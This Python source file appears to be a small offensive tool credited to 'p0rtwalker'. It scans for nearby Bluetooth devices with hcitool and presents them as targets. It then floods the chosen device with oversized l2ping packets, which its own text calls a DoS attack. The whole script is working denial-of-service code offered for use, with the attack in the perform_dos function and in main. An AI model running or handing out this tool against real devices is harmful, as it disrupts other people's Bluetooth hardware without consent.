import os
import subprocess

def scan_devices():
    try:
        print("Scanning...please wait.")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()
        devices = {}
        for line in lines[1:]:
            info = line.split()
            mac = info[0]
            device_name = ' '.join(info[2:])
            devices[mac] = device_name
        return devices
    except subprocess.CalledProcessError as e:
        print("Error:", e.output)
        return None

def print_device_info(devices):
    if devices:
        print("/_id/______/MAC_Address/____/Device_Name__/")
        print("---------------------------------------")
        for idx, (mac, name) in enumerate(devices.items()):
            print(f"| {idx}  |   {mac}  |   {name}")
        print("---------------------------------------")
    else:
        print("No devices found.")
        return None

def perform_dos(target_mac):
    print(f"Performing DoS attack on device with MAC address: {target_mac}")
    os.system(f"sudo l2ping -i hci0 -s 600 {target_mac}")

def main():
    print("""    _   _  _ _____ ___   __  __   _   _  _ ___ _    ___ 
   /_\ | \| |_   _|_ _| |  \/  | /_\ | \| | __| |  | __|
  / _ \| .` | | |  | |  | |\/| |/ _ \| .` | _|| |__| _| 
 /_/ \_\_|\_| |_| |___|_|_|  |_/_/ \_\_|\_|___|____|___|
                     |___|""")
    print("This is a simple Python script to scan for Bluetooth devices and DOS them with l2ping tool.")
    print("-made by p0rtwalker")
    print("https://github.com/p0rtwalker")
    print("if you don't find any device with hcitool scan you can use bluetoothctl and then write scan on")
    
    accept = input("Do you want to continue? (y/n): ").lower()
    if accept != "y":
        print("Exiting...")
        return
    
    devices = scan_devices()
    if devices:
        print_device_info(devices)
        target = input("Enter the ID or MAC address of the target device: ")
        if target.isdigit() and int(target) < len(devices):
            target_mac = list(devices.keys())[int(target)]
            perform_dos(target_mac)
        elif target in devices:
            perform_dos(target)
        else:
            print("Device not found in the list.")
    else:
        print("No devices found.")
        target_mac = input("Enter the MAC address of the target device: ")
        perform_dos(target_mac)

if __name__ == "__main__":
    main()
